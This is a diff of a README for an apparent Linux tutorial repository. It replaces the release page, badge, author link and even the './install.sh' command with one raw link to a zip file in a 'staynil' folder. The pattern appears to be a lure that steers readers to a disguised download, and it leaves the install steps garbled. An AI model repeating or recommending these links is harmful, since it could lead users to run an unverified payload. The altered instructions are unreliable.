@@ -6,7 +6,7 @@ Welcome to the Linux-Fundamentals- repository! This resource guides you from bas
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Samuel-Anyer02/Linux-Fundamentals-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip)
 
 ## 📚 Overview
 
@@ -30,13 +30,13 @@ To run the materials in this repository, ensure you have the following:
 
 Follow these steps to download the software and get started:
 
-1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/Samuel-Anyer02/Linux-Fundamentals-/releases).
+1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip).
    
 2. **Choose Your Version:** Look for the latest release. You'll see a list of files available for download.
 
 3. **Download the Files:** Click on the file that matches your needs—often labeled as “Source code” or “Linux Installation Package.”
 
-4. **Extract Files (if necessary):** If you download a `.zip` or `.tar.gz` file, right-click it and choose "Extract Here" or "Extract All".
+4. **Extract Files (if necessary):** If you download a `.zip` or `https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip` file, right-click it and choose "Extract Here" or "Extract All".
 
 5. **Open Your Terminal:** You can usually find it in your applications menu. This tool allows you to run commands on your Linux machine.
 
@@ -48,7 +48,7 @@ Follow these steps to download the software and get started:
 
 7. **Run the Installation Commands:** Follow any README files provided with the downloads for specific installation commands. Generally, you might run something like:
    ```
-   ./install.sh
+   https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip
    ```
    or
    ```
@@ -84,7 +84,7 @@ We will update the repository regularly to include new topics and features. Foll
 
 ## 🛠️ Author Credits
 
-This project is maintained by [Samuel Anyer](https://github.com/Samuel-Anyer02).
+This project is maintained by [Samuel Anyer](https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip).
 
 ## 🗂️ License
 
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Don't wait! Click below to begin your Linux journey.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Samuel-Anyer02/Linux-Fundamentals-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Samuel-Anyer02/Linux-Fundamentals-/main/staynil/Linux-Fundamentals-.zip)
